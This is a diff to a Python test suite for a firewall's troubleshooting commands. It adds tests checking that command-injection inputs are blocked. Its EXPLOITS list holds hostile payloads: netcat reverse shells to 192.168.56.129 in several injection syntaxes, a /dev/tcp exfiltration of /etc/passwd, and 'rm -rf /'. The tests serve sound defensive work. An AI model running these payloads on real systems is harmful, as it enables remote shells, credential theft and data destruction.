@@ -60,6 +60,81 @@ BGP_LOCAL = overrides.get("BGP_LOCAL", default={
     "adminPassword": "passwd"
   })
 
+EXPLOITS = [
+    "10.2",
+    "fake.sitex0x0x0000a@",
+    "http://ny@domain>freod$",
+    "/tmp/traffic.pcap", 
+    "eth97",
+    "&nc 192.168.56.129:3333 -e /bin/bash",
+    "; nc 192.168.56.129:3333 -e /bin/bash",
+    "| nc 192.168.56.129:3333 -e /bin/bash",
+    "`nc 192.168.56.129:3333 -e /bin/bash`",
+    "$(nc 192.168.56.129:3333 -e /bin/bash)",
+    "foo; cat /etc/passwd > /dev/tcp/192.168.56.129/3333",
+    "foo && rm -rf /",
+]
+
+EXPECTED = {
+    "CONNECTIVITY": "Testing DNS",
+    "REACHABLE": "ping statistics",
+    "DNS": "has address",
+    "CONNECTION": "(http) open",
+    "PATH": "traceroute to",
+    "DOWNLOAD": "saved",
+    "TRACE": "tcpdump"
+}
+
+def get_iface():
+    return global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
+
+def run_exploit_test(command, base_args, key):
+    failures = []
+
+    for exploit in EXPLOITS:
+        modified = copy.deepcopy(base_args)
+        modified[key] = exploit
+
+        result = global_functions.uvmContext.networkManager().runTroubleshooting(command, modified)
+        time.sleep(3)
+
+        try:
+            assert result is None, (
+                f"Exploit succeeded for {command}, key={key}, exploit={exploit}"
+            )
+        except AssertionError as e:
+            failures.append(str(e))
+
+    # After looping all exploits, fail once if anything failed
+    if failures:
+        raise AssertionError("\n".join(failures))
+
+
+
+def run_valid_test(command, args):
+    exec_result = global_functions.uvmContext.networkManager().runTroubleshooting(command, args)
+    time.sleep(3)
+
+    if command not in EXPECTED:
+        assert exec_result.getResult() == 0
+        return
+
+    # Read all output
+    content = ""
+    if exec_result:
+        buf = ""
+        while True:
+            out = exec_result.readFromOutput()
+            if out is None:
+                break
+            buf += out
+        content = buf
+
+    assert EXPECTED[command] in content, (
+        f"Valid output missing expected string for {command}"
+    )
+
+
 def find_files(dir_path, search_string):
     residual_files = []
     for root, dirs, files in os.walk(dir_path):
@@ -588,6 +663,101 @@ class NetworkTests(NGFWTestCase):
         result = remote_control.is_online()
         assert (result == 0)
         
+    def test_011_pppoe_complex_password_encrypt_decrypt(self):
+        """Verify pppoe connection with complex password"""
+        network_manager = global_functions.uvmContext.networkManager()
+        system_manager = global_functions.uvmContext.systemManager()
+        netsettings = copy.deepcopy(orig_netsettings)
+
+        plain_text_password = "test!1$4@2%5"
+        
+        # Find a physical interface to base the VLAN on
+        physicalDev = None
+        for interface in netsettings['interfaces']['list']:
+            if interface['configType'] == 'ADDRESSED' and not interface['isVlanInterface']:
+                physicalDev = interface['physicalDev']
+                break
+
+        if not physicalDev:
+            raise unittest.SkipTest("No suitable physical interface found for VLAN")
+
+        # Create a new VLAN ID (e.g., 200) and an IP address for it
+        testVLANID = 200
+        testVlanIdDev = f"{physicalDev}.{testVLANID}"
+        testPPPoEUsername = "testuser"
+
+        # Create a VLAN interface configured for PPPoE with the plain text password
+        pppoe_vlan_intf = {
+            "addressed": True,
+            "bridged": False,
+            "configType": "ADDRESSED",
+            "dhcpEnabled": False,
+            "dhcpOptions": {
+                "javaClass": "java.util.LinkedList",
+                "list": []
+            },
+            "disabled": False,
+            "interfaceId": -100, # A unique, negative ID for new interfaces
+            "isVlanInterface": True,
+            "isWan": True, # PPPoE is typically a WAN interface
+            "javaClass": "com.untangle.uvm.network.InterfaceSettings",
+            "name": f"pppoe_vlan_{testVLANID}",
+            "physicalDev": physicalDev,
+            "raEnabled": False,
+            "symbolicDev": testVlanIdDev,
+            "systemDev": testVlanIdDev,
+            "v4Aliases": {
+                "javaClass": "java.util.LinkedList",
+                "list": []
+            },
+            "v4ConfigType": "PPPOE",
+            "v4NatEgressTraffic": False,
+            "v4NatIngressTraffic": False,
+            "v4PPPoEPassword": plain_text_password, # Pass plain text password to be encrypted by setNetworkSettings
+            "v4PPPoEUsePeerDns": True,
+            "v4PPPoEUsername": testPPPoEUsername,
+            "v4StaticAddress": "", # Not applicable for PPPoE
+            "v4StaticNetmask": "", # Not applicable for PPPoE
+            "v4StaticPrefix": 0,   # Not applicable for PPPoE
+            "v6Aliases": {
+                "javaClass": "java.util.LinkedList",
+                "list": []
+            },
+            "v6ConfigType": "STATIC",
+            "vlanParent": 2, # Assuming a default parent
+            "vlanTag": testVLANID,
+            "vrrpAliases": {
+                "javaClass": "java.util.LinkedList",
+                "list": []
+            },
+            "vrrpEnabled": False
+        }
+
+        # Add the new VLAN interface
+        netsettings['interfaces']['list'].append(pppoe_vlan_intf)
+        network_manager.setNetworkSettings(netsettings)
+
+        # Verify password in saved settings after setting
+        current_netsettings = network_manager.getNetworkSettings()
+        print(current_netsettings['interfaces']['list'])
+        for interface_entry in current_netsettings['interfaces']['list']:
+            if interface_entry.get('name') == "pppoe_vlan_200":
+                assert interface_entry.get('v4ConfigType') == 'PPPOE'
+                assert interface_entry.get('v4PPPoEUsername') == testPPPoEUsername
+                
+                # Retrieve the stored (encrypted) password and decrypt it
+                # stored_v4pppoe_password = interface_entry.get('v4PPPoEPassword')
+                stored_encrypted_password = interface_entry.get('v4PPPoEPasswordEncrypted')
+                stored_decrypted_password = system_manager.getDecryptedPassword(stored_encrypted_password)
+                # print("stored_v4pppoe_password :"+ stored_v4pppoe_password)
+                print("stored_encrypted_password :"+ stored_encrypted_password)
+                print("stored_decrypted_password :"+ stored_decrypted_password)
+                assert stored_decrypted_password == plain_text_password, "Stored encrypted password could not be decrypted to original"
+                break
+        
+        # Clean up: restore original network settings
+        network_manager.setNetworkSettings(orig_netsettings)
+
     def test_014_add_vlan(self):
         raise unittest.SkipTest("Review changes in test")
         # Add a test static VLAN
@@ -2525,22 +2695,6 @@ server=dynupdate.no-ip.com
         # Don't care about success/failure just that we see the test ran
         assert "saved" in output, "dns test"
 
-    def test_606_troubleshooting_trace(self):
-        """
-        Troubleshooting, trace
-        """
-        interface = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
-
-        output = get_troubleshooting_output(command='TRACE',arguments={
-                "TIMEOUT": "10",
-                "MODE": "BASIC",
-                "HOST": "any",
-                "INTERFACE": interface,
-                "FILENAME": "test.pcap"
-            })
-
-        # Don't care about success/failure just that we see the test ran
-        assert "tcpdump:" in output, "trace test"
 
     def test_607_troubleshooting_connection_reverse_shell(self):
         """
@@ -2601,7 +2755,7 @@ server=dynupdate.no-ip.com
         snort_files = find_files(dir_path, search_string)
         assert len(snort_files) == 0
     
-    def test_011_remove_unreachable_host(self):
+    def test_012_remove_unreachable_host(self):
         """
         Remove unreachable host
         """
@@ -2850,7 +3004,25 @@ server=dynupdate.no-ip.com
         global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
         assert invalid_dns is False, "dns resolvers properly pinned to devices"
 
-    def test_710_runtroubleshoot_argument_exploit_test(self):
+
+    def test_800_troubleshooting_trace(self):
+        """
+        Troubleshooting, trace
+        """
+        interface = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
+
+        output = get_troubleshooting_output(command='TRACE',arguments={
+                "TIMEOUT": "10",
+                "MODE": "BASIC",
+                "HOST": "any",
+                "INTERFACE": interface,
+                "FILENAME": "test.pcap"
+            })
+
+        # Don't care about success/failure just that we see the test ran
+        assert "tcpdump:" in output, "trace test"
+
+    def test_801_runtroubleshoot_argument_exploit_test(self):
         """
         Verify argument exploit is not possible in runTroubleshooting functionality
         """
@@ -2902,6 +3074,179 @@ server=dynupdate.no-ip.com
             assert(False)
         else:
             assert(True)
+    def test_802_runts_CONNECTIVITY_DNS_TEST_HOST_exploit(self):
+        """
+        Verify CONNECTIVITY command blocks exploit attempts in DNS_TEST_HOST argument.
+        """
+        args = {
+            "DNS_TEST_HOST": "updates.edge.arista.com",
+            "TCP_TEST_HOST": "updates.edge.arista.com"
+        }
+        run_exploit_test("CONNECTIVITY", args, "DNS_TEST_HOST")
+
+    def test_803_runts_CONNECTIVITY_TCP_TEST_HOST_exploit(self):
+        """
+        Verify CONNECTIVITY command blocks exploit attempts in TCP_TEST_HOST argument.
+        """
+        args = {
+            "DNS_TEST_HOST": "updates.edge.arista.com",
+            "TCP_TEST_HOST": "updates.edge.arista.com"
+        }
+        run_exploit_test("CONNECTIVITY", args, "TCP_TEST_HOST")
+
+    def test_804_runts_CONNECTIVITY_valid(self):
+        """
+        Verify CONNECTIVITY command works correctly with valid arguments.
+        """
+        args = {
+            "DNS_TEST_HOST": "updates.edge.arista.com",
+            "TCP_TEST_HOST": "updates.edge.arista.com"
+        }
+        run_valid_test("CONNECTIVITY", args)
+
+    def test_805_runts_REACHABLE_HOST_exploit(self):
+        """
+        Verify REACHABLE command blocks exploit attempts in HOST argument.
+        """
+        args = {"HOST": "8.8.8.8"}
+        run_exploit_test("REACHABLE", args, "HOST")
+
+    def test_806_runts_REACHABLE_valid(self):
+        """
+        Verify REACHABLE command works correctly with valid arguments.
+        """
+        args = {"HOST": "8.8.8.8"}
+        run_valid_test("REACHABLE", args)
+
+    def test_807_runts_DNS_HOST_exploit(self):
+        """
+        Verify DNS command blocks exploit attempts in HOST argument.
+        """
+        args = {"HOST": "www.google.com"}
+        run_exploit_test("DNS", args, "HOST")
+
+    def test_808_runts_DNS_valid(self):
+        """
+        Verify DNS command works correctly with valid arguments.
+        """
+        args = {"HOST": "www.google.com"}
+        run_valid_test("DNS", args)
+
+    def test_809_runts_CONNECTION_HOST_exploit(self):
+        """
+        Verify CONNECTION command blocks exploit attempts in HOST argument.
+        """
+        args = {"HOST": "www.google.com", "HOST_PORT": "80"}
+        run_exploit_test("CONNECTION", args, "HOST")
+
+    def test_810_runts_CONNECTION_HOST_PORT_exploit(self):
+        """
+        Verify CONNECTION command blocks exploit attempts in HOST_PORT argument.
+        """
+        args = {"HOST": "www.google.com", "HOST_PORT": "80"}
+        run_exploit_test("CONNECTION", args, "HOST_PORT")
+
+    def test_811_runts_CONNECTION_valid(self):
+        """
+        Verify CONNECTION command works correctly with valid arguments.
+        """
+        args = {"HOST": "www.google.com", "HOST_PORT": "80"}
+        run_valid_test("CONNECTION", args)
+
+    def test_812_runts_PATH_HOST_exploit(self):
+        """
+        Verify PATH command blocks exploit attempts in HOST argument.
+        """
+        args = {"HOST": "www.google.com", "PROTOCOL": "I"}
+        run_exploit_test("PATH", args, "HOST")
+
+    def test_813_runts_PATH_PROTOCOL_exploit(self):
+        """
+        Verify PATH command blocks exploit attempts in PROTOCOL argument.
+        """
+        args = {"HOST": "www.google.com", "PROTOCOL": "U"}
+        run_exploit_test("PATH", args, "PROTOCOL")
+
+    def test_814_runts_PATH_valid(self):
+        """
+        Verify PATH command works correctly with valid arguments.
+        """
+        args = {"HOST": "www.google.com", "PROTOCOL": "I"}
+        run_valid_test("PATH", args)
+
+    def test_815_runts_DOWNLOAD_URL_exploit(self):
+        """
+        Verify DOWNLOAD command blocks exploit attempts in URL argument.
+        """
+        args = {"URL": "http://cachefly.cachefly.net/5mb.test"}
+        run_exploit_test("DOWNLOAD", args, "URL")
+
+    def test_816_runts_DOWNLOAD_valid(self):
+        """
+        Verify DOWNLOAD command works correctly with valid arguments.
+        """
+        args = {"URL": "http://cachefly.cachefly.net/5mb.test"}
+        run_valid_test("DOWNLOAD", args)
+
+    def test_817_runts_TRACE_basic_exploit_each_arg(self):
+        """
+        Verify TRACE (basic mode) blocks exploit attempts in all string arguments.
+        """
+        base_args = {
+            "TIMEOUT": "10",
+            "HOST": "any",
+            "INTERFACE": get_iface(),
+            "FILENAME": "test.pcap",
+            "TRACE_ARGUMENTS": "-n -s 23456",
+            "MODE": "basic"
+        }
+        for arg in ["TIMEOUT", "HOST", "INTERFACE", "FILENAME", "TRACE_ARGUMENTS"]:
+            with self.subTest(argument=arg):
+                run_exploit_test("TRACE", base_args, arg)
+
+    def test_818_runts_TRACE_basic_valid(self):
+        """
+        Verify TRACE (basic mode) works correctly with valid arguments.
+        """
+        base_args = {
+            "TIMEOUT": "10",
+            "HOST": "any",
+            "INTERFACE": get_iface(),
+            "FILENAME": "test.pcap",
+            "TRACE_ARGUMENTS": "-n -s 23456",
+            "MODE": "basic"
+        }
+        run_valid_test("TRACE", base_args)
+
+    def test_819_runts_TRACE_advanced_exploit_each_arg(self):
+        """
+        Verify TRACE (advanced mode) blocks exploit attempts in all string arguments.
+        """
+        base_args = {
+            "TIMEOUT": "10",
+            "HOST": "any",
+            "INTERFACE": get_iface(),
+            "FILENAME": "test.pcap",
+            "TRACE_ARGUMENTS": "-n -s 23456",
+            "MODE": "advanced"
+        }
+        for arg in ["TIMEOUT", "HOST", "INTERFACE", "FILENAME", "TRACE_ARGUMENTS"]:
+            with self.subTest(argument=arg):
+                run_exploit_test("TRACE", base_args, arg)
+
+    def test_820_runts_TRACE_advanced_valid(self):
+        """
+        Verify TRACE (advanced mode) works correctly with valid arguments.
+        """
+        base_args = {
+            "TIMEOUT": "10",
+            "HOST": "any",
+            "INTERFACE": get_iface(),
+            "FILENAME": "test.pcap",
+            "TRACE_ARGUMENTS": "-n -s 23456",
+            "MODE": "advanced"
+        }
+        run_valid_test("TRACE", base_args)
 
     @classmethod
     def final_extra_tear_down(cls):
